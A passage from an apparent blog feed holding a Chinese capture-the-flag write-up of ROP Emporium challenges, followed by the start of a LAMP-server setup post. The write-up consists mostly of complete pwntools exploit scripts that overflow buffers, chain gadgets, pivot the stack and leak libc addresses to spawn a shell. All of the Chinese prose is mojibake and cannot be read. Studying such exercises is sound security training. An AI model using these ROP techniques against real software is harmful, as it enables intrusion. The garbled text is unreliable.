æ®µçš„æ•°æ®ï¼Œä½†æ˜¯è¿™é‡Œæ±‡ç¼–æ˜¯<code>call</code>æ‰€ä»¥åœ¨å¡«çš„æ—¶å€™ï¼Œåº”è¯¥æ˜¯å¡«å……å…¶pltçš„åœ°å€ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/HxXaWe.png" srcset="/img/loading.gif" alt></p><h4 id="64ä½ï¼š-1"><a href="#64ä½ï¼š-1" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./callme&#39;)io.recvuntil(&#39;&gt;&#39;)offset = 40callme_one = 0x00401850callme_two = 0x000401870callme_three = 0x00401810pop3_ret = 0x0000000000401ab0payload = &#39;a&#39; * offset + p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one)payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two)payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>åˆ©ç”¨ <code>0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</code>è¿™ä¸ªgadgetæ¥æ§åˆ¶å‚æ•°ã€‚</p><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h3 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>è¿™ä¸ªé¢˜è·Ÿå‰é¢ç¬¬2é¢˜å¾ˆåƒï¼Œä½†æ˜¯å°±æ˜¯æ²¡æœ‰ç»™ä½ <code>cat flag</code> çš„å­—ç¬¦ä¸²äº†ã€‚éœ€è¦è‡ªå·±ç”¨ç¨‹åºçš„gadgetæ¥æ„é€ ã€‚æ€è·¯ä¹Ÿå°±æ˜¯è¿›è¡ŒropæŠŠ<code>/bin/sh</code>å¾€bssæ®µä¸Šå†™,ç„¶åæ¥ç€æ‹¿shellå°±å¥½äº†ã€‚</p><pre><code>ROPgadget --binary ./write4 --only &quot;mov|pop|ret&quot;</code></pre><p><strong>æŸ¥å¥½ç”¨çš„gadgetsï¼š</strong><br><img src="http://qiqianyun.chumen77.xyz/uPic/pY6tBk.png" srcset="/img/loading.gif" alt><br>åˆ©ç”¨è¿™å³å¯å°±å¯ä»¥äº†ï¼Œ32ä½çš„ç±»ä¼¼ã€‚</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š-2"><a href="#32ä½ï¼š-2" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./write432&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./write432&#39;)# bin_sh = elf.search(&#39;/bin/cat&#39;).next()offset = 44bss = 0x804A06C-0x10pop_edi_pop_ebp_ret = 0x080486dasystem = 0x8048430key = 0x08048670 #mov dword ptr [edi], ebp ; retpayload = &#39;a&#39; * offset + flat([pop_edi_pop_ebp_ret,bss,&#39;sh\x00\x00&#39;,key,system,0xdeadbeef,bss])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½ï¼š-2"><a href="#64ä½ï¼š-2" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./write4&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./write4&#39;)# bin_sh = elf.search(&#39;/bin/cat&#39;).next()offset = 40bss = 0x601090-0x10key1 = 0x0000000000400820# mov qword ptr [r14], r15 ; retkey2 = 0x0000000000400890# pop r14 ; pop r15 ; retkey3 = 0x0000000000400893#pop rdi ; retsystem = 0x000004005E0payload = &#39;a&#39; * offset + flat([key2,bss,&#39;/bin/sh\x00&#39;,key1,key3,bss,system])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h3 id="idaåˆ†æ-4"><a href="#idaåˆ†æ-4" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>è¿™ä¸ªé¢˜ç›®è·Ÿå‰ä¸€ä¸ªwrite4ååˆ†çš„ç›¸ä¼¼ï¼Œä½†æ˜¯å…¶è¿‡æ»¤äº†ä¸ªåˆ«å­—ç¬¦ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/C2HXoN.png" srcset="/img/loading.gif" alt><br>ä¼šå°†å…¶æ›¿æ¢ä¸º<code>0xEB</code>ï¼Œä¸ªäººè§£å†³åŠæ³•å°±æ˜¯åœ¨bssæ®µå†™å¥½è¢«ç¨‹åºå¤„ç†è¿‡çš„å­—ç¬¦ä¸²åï¼Œåœ¨ç”¨xorçš„gadgetsæ¥é‡æ–°æ”¹å›æ¥ï¼Œä¸ºäº†ä¾¿äºåˆ©ç”¨ï¼Œ32ä½å’Œ64ä½éƒ½æ˜¯æ„é€ <code>system(sh)</code>æ¥æ‹¿çš„shellã€‚<br>ä¾‹å­ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/4tnNv7.png" srcset="/img/loading.gif" alt><br>ä¼ è¿‡å»çš„æ˜¯<code>sh\x00\x00\x00\x00\x00\x00\x00</code> åˆ°bssæ˜¯è¿™ä¸ªæƒ…å†µï¼Œç„¶åå»æ‰¾xorçš„gadgetï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/4OvcwS.png" srcset="/img/loading.gif" alt><br>å…¶ä¸­æ³¨æ„è¿™æ˜¯ä»¥ä¸€ä¸ªbyteæ¥è¿›è¡Œxorçš„ï¼Œç„¶åè¿™ä¸ªå›¾xorçš„å€’æ•°ç¬¬ä¸€æ¡è¯­å¥ï¼Œ**å…¶ä¸­çš„æ˜¯dhï¼Œè¿™ä¸ªæ˜¯edxçš„é«˜ä½ã€‚r14bæ˜¯r14çš„ä½ä½ä¹Ÿæ˜¯ä¸€ä¸ªbyteçš„å­—èŠ‚å•ä½ã€‚<br>è¿™ä¸ªé¢˜ç›®åœ¨gdbè°ƒè¯•expæ—¶ä¼šå‘ç°æœ‰æ¯”è¾ƒä¾¿æ·çš„åŠæ³•ã€‚</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š-3"><a href="#32ä½ï¼š-3" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./badchars32&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./badchars32&#39;)key1 = 0x08048893# mov dword ptr [edi], esi ; retkey2 = 0x08048899# pop esi ; pop edi ; retkey3 = 0x08048461# pop ebx ; retbss = 0x804A06C-10key4 = 0x08048897# pop ecx ; retkey5 = 0x08048890#xor byte ptr [ebx], cl ; retsys = 0x080484E0offset = 44payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00&#39;,bss,key1,key3,bss,key4,0x98,key5,sys,0xdeadbeef,bss])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½ï¼š-3"><a href="#64ä½ï¼š-3" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./badchars&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./badchars&#39;)offset = 40bss = 0x6010B0key1 = 0x0000000000400b34# mov qword ptr [r13], r12 ; retkey2 = 0x0000000000400b3b# pop r12 ; pop r13 ; retkey3 = 0x0000000000400b39#pop rdi ; retkey4 = 0x0000000000400b30#xor byte ptr [r15], r14b ; retkey5 = 0x0000000000400b40#pop r14 ; pop r15 ; retsystem = 0x004006F0payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00\x00\x00\x00\x00&#39;,bss,key1,key5,0x98,bss,key4,key3,bss,system])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>è¿™ä¸ªé¢˜ç›®è¿˜æ˜¯è·Ÿwrite4å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯æ‰¾å¯ç”¨çš„gadgetæ˜¯ï¼Œæ¯”è¾ƒéš¾æ‰¾ã€‚éœ€è¦æƒ³å°½åŠæ³•æ‰¾å„ç§gadgetï¼Œç„¶åå åŠ åœ¨ä¸€èµ·æˆä¸ºéœ€è¦çš„é“¾ã€‚è¿™ä¸ªé¢˜çªç ´å£ä¹Ÿå°±åœ¨ï¼š</p><pre><code>mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</code></pre><p>ç„¶åå†å»æ‰¾ecxï¼Œedxç›¸å…³çš„gadgetï¼Œé‡Œé¢ç”¨åˆ°äº†xorå’Œxchgç­‰ç›¸å…³çš„gadgetã€‚<br>å…¶ä¸­64ä½çš„æ‰¾å¯ç”¨gadgetï¼Œè¿˜éœ€è¦æ§åˆ¶ä¸€ä¸‹æ·±åº¦ï¼š</p><pre><code>ROPgadget --binary ./fluff --depth 15 </code></pre><p>è¿™æ ·æ‰¾å‡ºè¶³å¤Ÿçš„gadgetï¼Œä»¥ä¾¿è‡ªå·±è¯•ç”¨ã€‚</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š-4"><a href="#32ä½ï¼š-4" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./fluff32&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./fluff32&#39;)key1 = 0x080483e1# pop ebx ; retkey2 = 0x08048671# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; retkey3 = 0x0804867b# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; retbss = 0x804A06Ckey4 = 0x08048689#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; retkey5 = 0x08048693# mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; retsys = 0x8048430offset = 44payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;sh\x00\x00&#39;,key2,1,key3,1,key5,1,0,sys,0xdeadbeef,bss])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½ï¼š-4"><a href="#64ä½ï¼š-4" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./fluff&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./fluff&#39;)key1 = 0x0000000000400832# pop r12 ; mov r13d, 0x604060 ; retkey2 = 0x0000000000400822#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; retkey3 = 0x000000000040082f#xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; retbss = 0x601090key4 = 0x0000000000400840##  : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; retkey5 = 0x000000000040084e# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; retkey6 = 0x00000000004008c3# pop rdi ; retsys = 0x4005E0offset = 40payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;/bin/sh\x00&#39;,key2,1,key3,1,key5,1,0,key6,bss,sys])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>è¿™ä¸ªé¢˜ä¸€çœ‹å°±æ˜¯æ ˆè½¬ç§»äº†ã€‚</p><h3 id="idaåˆ†æ-5"><a href="#idaåˆ†æ-5" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/zf6UXd.png" srcset="/img/loading.gif" alt><br>å¯ä»¥çœ‹åˆ°ä¼šç»™ä½ æ³„æ¼ä¸€ä¸ªå †åœ°å€ï¼Œç»™ä½ å»æ ˆè½¬ç§»ã€‚<br>æ¥ç€çœ‹åé—¨å‡½æ•°ï¼Œå‘ç°è¿™é‡Œcallä¸€ä¸ªä¸libcè¿æ¥çš„å‡½æ•°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/rdxJnU.png" srcset="/img/loading.gif" alt></p><p>æ¥ç€åˆ†æä¸€ä¸‹ç»™å®šçš„soæ–‡ä»¶ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/BkFCTM.png" srcset="/img/loading.gif" alt></p><pre><code class="c">void __noreturn ret2win(){  system(&quot;/bin/cat flag.txt&quot;);  exit(0);}</code></pre><p>æ¥ç€å°±æœ‰æ€è·¯äº†ï¼Œæ ˆè½¬ç§»åˆ°ç»™ä½ çš„å †åœ°å€ä¸Šï¼Œç„¶åæ„é€ ropé“¾ï¼š</p><ul><li>leak <code>foothold_function_got</code></li><li>ç®—å‡ºç»™çš„libcåŸºå€ï¼Œå›åˆ°startï¼Œå†æ¬¡åˆ©ç”¨æ¼æ´</li><li>æ„é€ jmpåˆ°ret2winçš„é“¾å³å¯<br>ä½†æ˜¯è¿™ä¸ªé¢˜ç›®è¿˜æ˜¯æœ‰æŠ€å·§çš„ï¼Œå‘ç°ç»™ä½ çš„å †åœ°å€å…¶å®è·Ÿè¿™ä¸ªlibcçš„å†…å­˜æ˜ å°„æ˜¯å¾ˆè¿‘çš„ï¼Œå¹¶ä¸”æ¯æ¬¡å·®è·ä¹Ÿæ˜¯å›ºå®šçš„ã€‚é‚£å°±å¯ä»¥ç›´æ¥åˆ†æsoæ–‡ä»¶ï¼Œæ¥ç®—å–åç§»ï¼Œç›´æ¥åˆ©ç”¨ã€‚</li></ul><p>æ ¹æ®ç»™çš„å †åœ°å€å’Œsoæ–‡ä»¶æ˜ å°„åŸºå€ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/6yPkYR.png" srcset="/img/loading.gif" alt></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><h4 id="32ä½ï¼š-5"><a href="#32ä½ï¼š-5" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot32&#39;)elf = ELF(&#39;./pivot32&#39;)libc = ELF(&#39;./libpivot32.so&#39;)foothold_function_plt = elf.plt[&#39;foothold_function&#39;]foothold_function_got = elf.got[&#39;foothold_function&#39;]put_plt = elf.plt[&#39;puts&#39;]key1 = 0x080486a8 #: leave ; retio.recvuntil(&#39;0x&#39;)leak = int(io.recv(8),16)print(&#39;leak_stack&#39;+ hex(leak))io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)payload = flat([0xdeadbeef,foothold_function_plt,put_plt,0x08048640,foothold_function_got])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;stack smash&#39;)io.recvuntil(&#39;&gt;&#39;)payload = 40 * &#39;a&#39; + p32(leak) +p32(key1)io.sendline(payload)io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)leak = u32(io.recv(4))print(&#39;leak&#39;+ hex(leak))ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)payload = &#39;a&#39; * 44 + p32(ret2win)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½ï¼š-5"><a href="#64ä½ï¼š-5" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot&#39;)elf = ELF(&#39;./pivot&#39;)libc = ELF(&#39;./libpivot.so&#39;)foothold_function_plt = elf.plt[&#39;foothold_function&#39;]foothold_function_got = elf.got[&#39;foothold_function&#39;]offset = libc.symbols[&#39;foothold_function&#39;] - libc.symbols[&#39;ret2win&#39;]put_plt = elf.plt[&#39;puts&#39;]key1 = 0x0000000000400a39 #: leave ; retkey2 = 0x0000000000400b73#pop rdi ; retkey3 = 0x0000000000400b02#xchg rax, rsp ; retkey4 = 0x0000000000400b00#pop rax ; retprint(&#39;offset:&#39; + hex(offset))io.recvuntil(&#39;0x&#39;)leak = int(io.recv(12),16)print(&#39;leak_stack&#39;+ hex(leak))io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)payload = flat([foothold_function_plt,key2,foothold_function_got,put_plt,0x004008A0])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;stack smash&#39;)io.recvuntil(&#39;&gt;&#39;)payload = 40 * &#39;a&#39; + p64(key4)+ p64(leak) + p64(key3)io.sendline(payload)io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)leak = int(u64(io.recv(6).ljust(8,&#39;\x00&#39;)))print(&#39;leak&#39;+ hex(leak))ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]print(&#39;ret2win&#39;+ hex(ret2win))# raw_input(&#39;-&gt;&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 40 + p64(ret2win)io.sendline(payload)io.interactive()</code></pre><p>è¿™ä¸ªåœ°æ–¹å› ä¸ºæ˜¯fgetså‡½æ•°æ¥è·å–å­—ç¬¦ä¸²ï¼Œå…¶é‡åˆ°æ¢è¡Œå°±ä¼šç»“æŸï¼Œä½†æ˜¯åœ¨æ‰¾gadgat çš„æ—¶å€™å‘ç°<code>leave ret</code>çš„è¿™ä¸ªgadgetï¼Œåœ°å€éƒ½æ˜¯æœ‰<code>0x0a</code>,æ‰€ä»¥åªèƒ½æ›´æ¢gadgetï¼Œæ¥ä¼ªé€ æ ˆã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/bZjoUw.png" srcset="/img/loading.gif" alt></p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><h4 id="32ä½ï¼š-6"><a href="#32ä½ï¼š-6" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot32&#39;)elf = ELF(&#39;./pivot32&#39;)offset = 44io.recvuntil(&#39;0x&#39;)leak1 = int(io.recv(8),16) + 1921272 + 0x000000967print(&#39;leak&#39;+ hex(leak1))raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + p32(leak1)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½ï¼š-6"><a href="#64ä½ï¼š-6" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot&#39;)elf = ELF(&#39;./pivot&#39;)libc = ELF(&#39;./libpivot.so&#39;)offset = 40io.recvuntil(&#39;0x&#39;)leak1 = int(io.recv(12),16) + 3977456 + libc.symbols[&#39;ret2win&#39;]raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + p64(leak1)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯å†è€ƒret2csuï¼ˆ64ä½çš„ä¸‡èƒ½gadgetï¼‰ï¼Œè®©ä½ æ§åˆ¶rdxï¼ˆç¬¬ä¸‰ä¸ªå‚æ•°çš„å¯„å­˜å™¨ï¼‰ä¸º<code>0xdeadcafebabebeef</code> å°±å¯ä»¥äº†ã€‚ä½†æ˜¯æ¯”è¾ƒéš¾æçš„ä¸€ç‚¹æ˜¯ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/6lYgiL.png" srcset="/img/loading.gif" alt><br>åœ¨è¿™ä¸ªåœ°æ–¹æ˜¯callï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥å¡«ä¸€ä¸ªgotçš„åœ°å€ã€‚ä¸èƒ½æ˜¯ä¸€ä¸ªåœ°å€æˆ–è€…pltã€‚å› ä¸º<code>call 0xaaaaa</code> æ±‡ç¼–ä½œç”¨ï¼š</p><ul><li>push PCï¼ˆä¹Ÿå°±æ˜¯è¯¥æ±‡ç¼–æŒ‡ä»¤çš„ä¸‹ä¸€ä¸ªæ±‡ç¼–æŒ‡ä»¤çš„åœ°å€ï¼‰</li><li><code>jmp [0xaaaaa]</code> æ˜¯è¯¥å‡½æ•°pointæŒ‡å‘çš„åœ°å€</li></ul><p>è¿™ä¸ªé¢˜ç›®åœ¨callå®Œæ¯ä¸€ä¸ªå‡½æ•°è‡ªå¸¦çš„æ­£å¸¸åº“å‡½æ•°åï¼Œéƒ½å°†å…¶gotè¡¨æ¸…0ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/9we7VY.png" srcset="/img/loading.gif" alt><br>ä½†æ˜¯ä¼šå‘ç°ä¸Šé¢è¿˜æœ‰ä¸€ä¸ªåŠ¨æ€é“¾æ¥<code>_DYNAMIC</code>çš„ä¿¡æ¯ï¼Œè·Ÿè¿›å»ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/iTqAvV.png" srcset="/img/loading.gif" alt><br>å‘ç°ä¸€å †åˆå§‹åŒ–ç”¨çš„å‡½æ•°ã€‚ç„¶åç‚¹è¿›å»ç¬¬ä¸€ä¸ªå¯ä»¥çœ‹çœ‹ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/GAIVGt.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/njC4qf.png" srcset="/img/loading.gif" alt><br>å‘ç°è¿™é‡Œä¹Ÿæ²¡æœ‰å¯¹rdxè¿›è¡Œå¤„ç†ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªã€‚ç°åœ¨å°±æ˜¯ç¡®å®šä¸€ä¸‹å“ªé‡Œå­˜æ”¾ç€<code>0x400560</code>ï¼Œæ¯«æ— ç–‘é—®è‚¯å®šæ˜¯è¿™ä¸ª<code>_DYNAMIC</code>é‡Œï¼Œä½†æ˜¯è‡ªå·±ç›®å‰è¿˜ä¸ç†Ÿæ‚‰è¿™ä¸ªç»“æ„ï¼Œçœ‹èµ·æ¥è²Œä¼¼æ˜¯ä¸ªç»“æ„ä½“ã€‚å…ˆgdbè·Ÿå…¥æŸ¥çœ‹å§ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/wzkBKI.png" srcset="/img/loading.gif" alt><br>å‘ç°åº”è¯¥æ˜¯<code>0x0600E38</code>ã€‚æ¥ä¸‹æ¥çš„å°±ç®€å•äº†ï¼Œä¼ ç»Ÿçš„ret2csuã€‚</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./ret2csu&#39;)elf = ELF(&#39;./ret2csu&#39;)offset = 40io.recvuntil(&#39;&gt;&#39;)key1 = 0x040089Akey2 = 0x000400880key3 = 0x0000600E38raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + flat([key1,0,1,key3,0,0,0xdeadcafebabebeef,key2,7*8*&#39;a&#39;,0x000004007B1])io.sendline(payload)io.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ropemporium-é€šå…³è®°å½•&quot;&gt;&lt;a href=&quot;#Ropemporium-é€šå…³è®°å½•&quot; class=&quot;headerlink&quot; title=&quot;Ropemporium é€šå…³è®°å½•&quot;&gt;&lt;/a&gt;Ropemporium é€šå…³è®°å½•&lt;/h1&gt;&lt;h2 id=&quot;ret2win&quot;&gt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="wp" scheme="http://chumen77.xyz/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>linux- Lampæ­å»ºè®°å½•</title>
    <link href="http://chumen77.xyz/2020/04/08/linux_%20Lamp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/04/08/linux_ Lampæ­å»ºè®°å½•/</id>
    <published>2020-04-08T06:24:44.064Z</published>
    <updated>2020-04-15T14:16:28.952Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lampæ­å»ºè®°å½•"><a href="#Lampæ­å»ºè®°å½•" class="headerlink" title="Lampæ­å»ºè®°å½•"></a>Lampæ­å»ºè®°å½•</h1><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><h3 id="å®‰è£…ç¼–è¯‘ç¯å¢ƒï¼š"><a href="#å®‰è£…ç¼–è¯‘ç¯å¢ƒï¼š" class="headerlink" title="å®‰è£…ç¼–è¯‘ç¯å¢ƒï¼š"></a>å®‰è£…ç¼–è¯‘ç¯å¢ƒï¼š</h3><pre><code>yum -y install gcc*</code></pre><p>å®‰è£…å¥½åè®°å¾—å…³é—­é˜²ç«å¢™å’Œselinux</p><h3 id="å‡†å¤‡è½¯ä»¶åŒ…"><a href="#å‡†å¤‡è½¯ä»¶åŒ…" class="headerlink" title="å‡†å¤‡è½¯ä»¶åŒ…"></a>å‡†å¤‡è½¯ä»¶åŒ…</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/phSpwE.png" srcset="/img/loading.gif" alt><br>æŠŠè¿™äº›å®‰è£…åŒ…éƒ½æ”¾å…¥è™šæ‹Ÿæœºè‡ªå®šä¹‰çš„è·¯å¾„ï¼Œç­‰å¾…ä½¿ç”¨ã€‚</p><h3 id="shellè„šæœ¬æ‰¹é‡è§£åŒ…"><a href="#shellè„šæœ¬æ‰¹é‡è§£åŒ…" class="headerlink" title="shellè„šæœ¬æ‰¹é‡è§£åŒ…"></a>shellè„šæœ¬æ‰¹é‡è§£åŒ…</h3><pre><code class="bash">#!/bin/bash/bin/ls *tar.gz &gt; ls.list/bin/ls *tgz &gt;&gt; ls.listfor a in `cat ls.list`do        /bin/tar -zxf $adonerm -rf ls.list</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/YX4fnr.png" srcset="/img/loading.gif" alt><br>ç„¶åå¼€å§‹ä¸€ä¸€çš„è£…åŒ…ï¼Œæ³¨æ„éœ€è¦æŒ‰ç…§ä¸€å®šçš„é¡ºåºæ¥è£…çš„ã€‚</p><h2 id="python-devel"><a href="#python-devel" class="headerlink" title="python-devel"></a>python-devel</h2><pre><code class="bash">yum -y install python-devel</code></pre><p>å®‰è£…pythonçš„åº•å±‚ç¯å¢ƒã€‚</p><pre><code class="bash">[root@localhost lamp1]# cd libxml2-2.9.1/[root@localhost libxml2-2.9.1]# ./configure --prefix=/usr/local/libxml2/[root@localhost libxml2-2.9.1]# make[root@localhost libxml2-2.9.1]# make install</code></pre><h2 id="libmcrypt"><a href="#libmcrypt" class="headerlink" title="libmcrypt"></a>libmcrypt</h2><p>æä¾›ä¸€äº›åŠ å¯†ç®—æ³•ï¼š</p><pre><code class="bash">[root@localhost lamp1]# cd libmcrypt-2.5.8/[root@localhost libmcrypt-2.5.8]# ./configure --prefix=/usr/local/libmcrypt/[root@localhost libmcrypt-2.5.8]# make[root@localhost libmcrypt-2.5.8]# make install</code></pre><h2 id="libltdl"><a href="#libltdl" class="headerlink" title="libltdl"></a>libltdl</h2><pre><code class="bash">[root@localhost lamp1]# cd libmcrypt-2.5.8/libltdl/[root@localhost libltdl]# ./configure --enable-ltdl-install[root@localhost libltdl]# make[root@localhost libltdl]# make install</code></pre><h2 id="mhash"><a href="#mhash" class="headerlink" title="mhash"></a>mhash</h2><p>æä¾›åŠ å¯†æ–¹å¼çš„æ‰©å±•</p><pre><code class="bash">[root@localhost lamp1]# cd mhash-0.9.9.9/[root@localhost mhash-0.9.9.9]# ./configure</code></pre><h2 id="mcrypt"><a href="#mcrypt" class="headerlink" title="mcrypt"></a>mcrypt</h2><p>æä¾›phpç›¸å…³çš„åŠ å¯†æ”¯æŒæ‹“å±•åº“</p><pre><code class="bash">[root@localhost mcrypt-2.6.8]# LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib \./configure --with-libmcrypt-prefix=/usr/local/libmcrypt[root@localhost mcrypt-2.6.8]# make[root@localhost mcrypt-2.6.8]# make install</code></pre><h2 id="zlib"><a href="#zlib" class="headerlink" title="zlib"></a>zlib</h2><p>æä¾›å‹ç¼©ç”¨é€”çš„å‡½æ•°åº“</p><pre><code class="bash">[roott@localhost lamp1]# cd zlib-1.2.3/[root@localhost zlib-1.2.3]# ./configure[root@localhost zlib-1.2.3]# make[root@localhost zlib-1.2.3]# make install</code></pre><h2 id="libpng"><a href="#libpng" class="headerlink" title="libpng"></a>libpng</h2><pre><code class="bash">[root@localhost zlib-1.2.3]# cd ../[root@localhost lamp1]# cd libpng-1.2.31/[root@localhost 